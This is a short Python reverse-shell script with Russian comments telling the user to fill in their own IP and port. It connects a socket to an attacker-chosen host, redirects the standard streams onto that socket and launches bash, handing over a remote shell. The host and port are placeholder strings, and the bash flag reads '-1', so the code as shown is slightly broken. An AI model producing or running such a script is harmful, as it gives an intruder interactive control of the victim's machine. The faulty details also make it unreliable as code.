import socket
import subprocess
import os



host = "Ищем сервера"
port = "port"

sock = socket.socket()      ### ip свой
sock.connect((host,port))   ### так же порт

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["bash", "-1"])



